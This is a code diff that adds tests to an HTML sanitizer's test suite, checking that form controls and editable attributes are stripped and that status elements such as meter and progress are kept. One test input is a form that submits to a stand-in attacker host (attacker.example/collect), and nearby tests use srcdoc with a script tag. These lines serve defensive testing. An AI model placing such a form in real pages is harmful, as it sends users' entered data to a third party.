@@ -118,6 +118,34 @@ describe('sanitize', () => {
     expect(out).not.toContain('formaction');
   });
 
+  it('strips form controls and editable attributes while preserving text', () => {
+    const out = sanitize(
+      '<form action="https://attacker.example/collect"><fieldset><legend>Profile</legend><label for="name">Name</label><input id="name" name="name" value="Alice"><button type="submit">Send</button><select name="role"><option>Admin</option></select><textarea name="notes">Notes</textarea></fieldset></form><p contenteditable="true" spellcheck="true" tabindex="0">Editable text</p>',
+    ).output;
+
+    expect(out).not.toMatch(
+      /<(?:form|input|button|select|option|optgroup|datalist|textarea|keygen)\b/i,
+    );
+    expect(out).not.toMatch(/\b(?:contenteditable|autofocus)=/i);
+    expect(out).toContain('Profile');
+    expect(out).toContain('Name');
+    expect(out).toContain('Admin');
+    expect(out).toContain('Notes');
+    expect(out).toContain('Editable text');
+  });
+
+  it('preserves non-editable status and grouping elements', () => {
+    const out = sanitize(
+      '<fieldset><legend>Progress</legend><meter value="0.7">70%</meter><progress value="7" max="10">70%</progress><output>Ready</output></fieldset>',
+    ).output;
+
+    expect(out).toContain('<fieldset>');
+    expect(out).toContain('<legend>Progress</legend>');
+    expect(out).toContain('<meter value="0.7">70%</meter>');
+    expect(out).toContain('<progress value="7">70%</progress>');
+    expect(out).toContain('<output>Ready</output>');
+  });
+
   it('strips srcdoc on any element', () => {
     const out = sanitize('<iframe srcdoc="<script>x</script>"></iframe>').output;
     expect(out).not.toContain('srcdoc');
